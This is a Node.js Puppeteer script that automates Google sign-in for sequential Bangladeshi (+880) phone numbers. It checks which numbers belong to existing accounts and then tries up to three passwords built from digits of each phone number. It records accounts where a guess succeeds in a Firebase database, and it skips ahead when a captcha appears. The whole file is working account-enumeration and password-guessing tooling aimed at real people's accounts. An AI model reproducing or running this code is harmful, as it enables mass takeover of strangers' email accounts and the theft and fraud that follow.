const puppeteer = require('./puppeteer/Puppeteer.js')

let update = 0
let mLoadSuccess = false
let mPrevNumber = 0
let mNumber = 0

module.exports = class {
    constructor (db, server, sirial, size) {
        this.SERVER = server
        this.SIRIAL = sirial
        this.SIZE = size
        this.database = db

        this.mMain = null
        mLoadSuccess = false
        mPrevNumber = 0
        mNumber = 0
        this.mPasswordTry = 0
        this.mCapture = false
        mNumber = 0
        this.mLoad = 0
        this.mSirial = 0

        this.page = null
        this.browser = null

        this.signin = 'https://accounts.google.com/signin/v2/identifier?service=accountsettings&hl=en-US&continue=https://myaccount.google.com/intro/security&csig=AF-SEnY7bxxtADWhtFc_:1556625798&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
        
        update = parseInt(new Date().getTime() / 1000)
        

        setInterval(function() {
            this.now = parseInt(new Date().getTime() / 1000)

            if(((this.now-update) > 60 && mLoadSuccess) || (mNumber == mPrevNumber && mLoadSuccess)) {
                console.log('---Restart Browser---')
                request.get({ url: 'xxx' }, function (error, response, body) { })
            }

            if(mLoadSuccess) {
                mPrevNumber = mNumber
            }
        },60000)
    }

    async start() {
        console.log('Downloading data...')

        this.database.child('sirial').once('value', (snapshot) => {
            const value = snapshot.val()
            if(value != null) {
                this.mSirial = parseInt(value[this.SIRIAL])
                this.database.child('server').child(this.SERVER).once('value', (snapshot) => {
                    const value = snapshot.val()
                    if(value != null) {
                        if(value['start_'+this.SIZE] == null) {
                            mNumber = parseInt(this.SIRIAL+this.mSirial+'000000')
                            this.database.child('server').child(this.SERVER).child('runing_'+this.SIZE).set(mNumber)
                            this.database.child('server').child(this.SERVER).child('start_'+this.SIZE).set(parseInt(this.SIRIAL+this.mSirial))
                            this.database.child('sirial').child(this.SIRIAL).set(this.mSirial+1)
                        } else {
                            this.mSirial = parseInt(value['start_'+this.SIZE])
                            mNumber = parseInt(value['runing_'+this.SIZE])
                            //mNumber = 1748008229
                        }
                        
                        console.log('+880'+mNumber)
                        console.log('Download Success')
                        this.startService()
                    }
                })
            }
        })
    }

    async startService() {

        ;(async () => {
    
            this.browser = await puppeteer.launch({
                headless: true,
                args: [ '--no-sandbox', '--disable-setuid-sandbox' ]
            })
    
            this.page = await this.browser.newPage()
    
            await this.page.setUserAgent('Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36')
    
            await this.page.setRequestInterceptionEnabled(true)
            
            this.page.on('request', async request => {
                const url = request.url
                update = parseInt(new Date().getTime() / 1000)
                if(url.startsWith('https://fonts.gstatic.com/s/') || url.startsWith('https://accounts.google.com/_/kids/signup/eligible') || url.startsWith('https://accounts.google.com/generate')) {
                    request.abort()
                } else {
                    request.continue()
                }
    
                if(url.startsWith('https://accounts.google.com/_/lookup/accountlookup') && mLoadSuccess) {
                    await this.delay(1000)
                    const output = await this.page.evaluate(() => {
                        let root = document.querySelector('div.o6cuMc')
                        if(root && root.innerHTML.includes(`Couldn't find your Google Account. Try using your email address instead.`)) {
                            return true
                        } else {
                            return false
                        }
                    })
    
                    if(output) {
                        mNumber++
                        this.mLoad++
                        if(this.mLoad % 10 == 0) {
                            console.log('ID:' +this.SIZE+' --- '+this.mLoad+' --- Null')
                            this.database.child('server').child(this.SERVER).child('runing_'+this.SIZE).set(mNumber)
                        }
                        await this.page.evaluate((number) => { let root = document.querySelector('input[type="email"]'); if(root) root.value = number }, '+880'+mNumber)
                        await this.page.evaluate(() => { try { let root = document.querySelector('#identifierNext'); if(root) root.click() } catch(e) {} })
                    }
                } else if(url.startsWith('https://accounts.google.com/generate') && mLoadSuccess) {
                    const output = await this.page.evaluate(() => {
                        let root = document.querySelector('#identifierNext')
                        if(root) {
                            return true
                        } else {
                            return false
                        }
                    })
    
                    this.mCapture = false
    
                    if(output) {
                        await this.page.evaluate((number) => { let root = document.querySelector('input[type="email"]'); if(root) root.value = number }, '+880'+mNumber)
                        await this.page.evaluate(() => { try { let root = document.querySelector('#identifierNext'); if(root) root.click() } catch(e) {} })
                    } else {
                        await this.checkPassword()
                    }
                } else if(url.startsWith('https://accounts.google.com/_/signin/challenge')) {
                    await this.delay(2000)
                    const output = await this.page.evaluate(() => {
                        let root = document.querySelector('div.OyEIQ.uSvLId')
                        if(root && (root.innerHTML.includes('Wrong password. Try again or click Forgot password to reset it') || root.innerHTML.includes('Your password was changed'))) {
                            return true
                        } else {
                            return false
                        }
                    })
                    
                    if(output) {
                        await this.checkPassword()
                    } else {
                        mNumber++
                        this.mLoad++
                        this.database.child('server').child(this.SERVER).child('runing_'+this.SIZE).set(mNumber)
                        if(this.mPasswordTry > 0) {
                            console.log('ID: '+this.SIZE+' --- Gmail got it')
                            this.database.child('active').child(mNumber-1).set(this.mPasswordTry-1)
    
                            this.mPasswordTry = 0
                            await this.delay(1000)
                            await this.page.setCookie(...[])
                            await this.delay(2000)
                            await this.page.goto(this.signin)
                        }
                    }
                }else if(url.startsWith('https://accounts.google.com/Captcha')) {
                    if(!this.mCapture) {
                        this.mCapture = true
                        this.mPasswordTry = 0
                        mNumber++
                        this.mLoad++
                        let output = await this.page.evaluate(() => {
                            try {
                                let root = document.querySelector('div.YZrg6.HnRr5d.iiFyne.cd29Sd')
                                if(root) {
                                    root.click()
                                    return true
                                }
                            } catch (e) {}
                            return false
                        })
    
                        if(!output) {
                            this.database.child('server').child(this.SERVER).child('runing_'+this.SIZE).set(mNumber)
                            this.mPasswordTry = 0
                            await this.page.goto(this.signin)
                        }
                    }
                }
            })

            this.page.on('dialog', async dialog => dialog.type() == "beforeunload" && dialog.accept())
            
            await this.page.goto(this.signin).catch(err => {
                console.log('error')
            })

            mLoadSuccess = true
    
            console.log('Load Success '+this.SIZE)
        })()
    }

    async checkPassword() {
        if(this.mPasswordTry >= 3) {
            this.mPasswordTry = 0
            mNumber++
            this.mLoad++
            this.database.child('server').child(this.SERVER).child('runing_'+this.SIZE).set(mNumber)
            this.page.goBack()
        } else {
            let password = ''
            if(this.mPasswordTry == 0) {
                password = '0'+mNumber
                console.log('ID:' +this.SIZE+' --- '+this.mLoad+' --- +88'+password)
            } else if(this.mPasswordTry == 1) {
                let temp = '0'+mNumber
                password = temp.substring(0, 8)
            } else if(this.mPasswordTry == 2) {
                let temp = '0'+mNumber
                password = temp.substring(3, 11)
            }
            await this.page.evaluate((pass) => document.querySelector('input[type="password"]').value = pass, password)
            this.mPasswordTry++
            await this.page.evaluate(() => document.querySelector('#passwordNext').click())
        }
    }

    getPage() {
       return this.page
    }

    async delay(time) {
        return new Promise(function(resolve) { 
            setTimeout(resolve, time)
        });
      }
}